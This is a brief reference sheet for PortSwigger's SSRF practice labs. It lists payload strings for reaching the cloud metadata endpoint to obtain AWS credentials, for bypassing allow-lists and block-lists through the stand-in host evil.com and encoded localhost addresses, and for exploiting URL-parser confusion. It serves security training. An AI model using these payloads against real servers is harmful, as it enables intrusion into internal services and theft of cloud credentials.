# PortSwigger SSRF Labs — Complete Reference

## Categories (10+ labs)
1. **Basic SSRF** — `url=http://169.254.169.254/latest/meta-data/` → AWS creds
2. **SSRF with whitelist** — `url=http://expected@evil.com` (credentials bypass)
3. **SSRF with blacklist** — `url=http://127.0.0.1:8080/admin`, `url=http://2130706433/`
4. **SSRF with DNS rebinding** — Domain that alternates between IPs
5. **Blind SSRF (OAST)** — Detect via Collaborator
6. **SSRF in backend API** — Manipulate URL parameter to internal services
7. **SSRF via Referer header** — Server fetches Referer
8. **SSRF through URL parser confusion** — Use `http://localhost#` or `http://127.0.0.1:80#@evil.com`

## Bypass Cheatsheet
- IPv6: `http://[::1]:8080/admin`
- Decimal: `http://2130706433/`
- Hex: `http://0x7f000001/`
- URL: `http://127.0.0.1:80%00@evil.com/`
- Redirect bypass: External URL redirects to internal
